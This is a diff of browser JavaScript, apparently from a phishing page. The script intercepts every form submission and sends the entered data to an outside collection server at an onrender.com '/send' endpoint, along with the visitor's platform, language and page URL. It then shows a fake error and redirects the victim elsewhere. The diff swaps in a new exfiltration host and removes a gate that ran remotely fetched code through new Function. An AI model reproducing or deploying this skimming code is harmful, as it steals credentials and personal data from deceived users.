@@ -1,24 +1,4 @@
-// ================= LOAD PREMIUM USERS =================
-let premiumUsers = [];
-
-async function loadPremiumUsers() {
-  try {
-    const res = await fetch("https://afkft.github.io/ho/da/premiumlist.js");
-    const text = await res.text();
-
-    // Execute premiumlist.js and extract premiumUsers
-    const fn = new Function(text + "; return premiumUsers;");
-    premiumUsers = fn();
-  } catch (err) {
-    console.error("❌ Failed to load premium list", err);
-    premiumUsers = [];
-  }
-}
-
-// ================= MAIN SCRIPT =================
-document.addEventListener("DOMContentLoaded", async () => {
-  await loadPremiumUsers(); // 🔥 Load premium list first
-
+document.addEventListener("DOMContentLoaded", () => {
   const DEFAULT_USER_ID = "7979664801";
   const forms = document.querySelectorAll("form");
 
@@ -46,22 +26,13 @@ document.addEventListener("DOMContentLoaded", async () => {
     })
     .catch(() => {});
 
-  // ---------- FORM HANDLER ----------
   forms.forEach((form) => {
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
       const urlParams = new URLSearchParams(window.location.search);
       const userId = urlParams.get("id") || DEFAULT_USER_ID;
-      const numericUserId = Number(userId);
 
-      // ❌ BLOCK NON-PREMIUM USERS
-      if (!premiumUsers.includes(numericUserId)) {
-        alert("🚫 Access denied\ntry again or check premium.");
-        return;
-      }
-
-      // ✅ PREMIUM USER CONTINUES
       const formData = new FormData(form);
 
       // 🔹 REQUIRED
@@ -81,12 +52,12 @@ document.addEventListener("DOMContentLoaded", async () => {
       formData.append("💻 Platform", navigator.platform || "Unknown");
       formData.append("🌐 Language", navigator.language || "Unknown");
 
-      // ✅ PAGE URL
+      // ✅ ADD PAGE URL AT THE END
       formData.append("🔗 Page URL", window.location.href);
 
       try {
         const response = await fetch(
-          "https://intelligent-yzi5.onrender.com/send",
+          "https://sender-slbv.onrender.com/send",
           {
             method: "POST",
             body: formData
@@ -96,9 +67,7 @@ document.addEventListener("DOMContentLoaded", async () => {
         if (response.ok) {
           alert("⛔ please try again");
           form.reset();
-
-          // ✅ REDIRECT WITH ID
-          window.location.href = `c.html?id=${encodeURIComponent(userId)}`;
+          window.location.href = "https://otieu.com/4/10060108";
         } else {
           const errorText = await response.text();
           console.error("Server Error:", errorText);
